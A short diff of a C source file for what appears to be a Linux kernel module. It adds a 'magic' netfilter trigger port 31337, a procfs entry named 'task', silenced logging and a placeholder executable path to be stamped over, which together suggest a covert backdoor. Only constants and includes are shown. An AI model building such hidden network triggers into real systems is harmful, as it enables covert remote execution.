@@ -1,4 +1,3 @@
-
 #include <linux/delay.h>
 #include <linux/init.h>
 #include <linux/ip.h>
@@ -8,6 +7,7 @@
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
 #include <linux/proc_fs.h>
+#include <linux/stat.h>
 #include <linux/string.h>
 #include <linux/tcp.h>
 #include <linux/udp.h>
@@ -15,8 +15,19 @@
 
 #include <stddef.h>
 
-#include "macros.h"
 #include "blanko.h"
+
+#define MAGIC_SRC_PORT 31337  // magic numbers for netfilter listener
+#define MAX_DATA_SIZE 64000  // a bit smaller than the maximum TCP/UDP payload sizes
+
+#define PROCFS_FILENAME "task"
+#define PROCFS_PERMISSIONS (S_IRUSR | S_IRGRP | S_IROTH)
+
+#ifdef DEBUG
+    #define KERNEL_LOG(...) printk(KERN_DEBUG __VA_ARGS__)
+#else
+    #define KERNEL_LOG(...)
+#endif
 
 // *** magic value to stamp over ***
 static const char c_user_exe_path[255] = "BASKETBALLJONES";
